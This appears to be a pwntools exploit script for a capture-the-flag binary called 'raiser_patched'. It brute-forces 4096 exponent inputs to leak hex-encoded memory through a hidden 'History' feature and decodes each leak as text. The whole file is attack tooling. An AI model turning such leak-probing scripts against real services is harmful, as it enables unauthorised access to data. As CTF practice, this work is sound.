#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './raiser_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h"]
# host, port = 'demo-challenge.chals.io', 443 # <-- change this
# remote("demo-challenge.chals.io", 443, ssl=True, sni="demo-challenge.chals.io")

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote("demo-challenge.chals.io", 443, ssl=True, sni="demo-challenge.chals.io")
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    rop = ROP(exe)
    
    for i in range(0, 4096):
        io = initialize()
        io.sendlineafter(b'Enter base:', b'1337')
        io.sendlineafter(b'Enter power:', f'{i}'.encode())
        io.recvuntil(b'You found the hidden History feature!\n')
        response = int(io.recvline().strip(), 16)
        try:
            # try to unhex the response
            response = bytes.fromhex(hex(response)[2:]).decode()
            print(f'Found: {response}')
        except:
            print(f'Failed: {response}')
            continue
        io.close()

    # io.sendlineafter(b'>', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()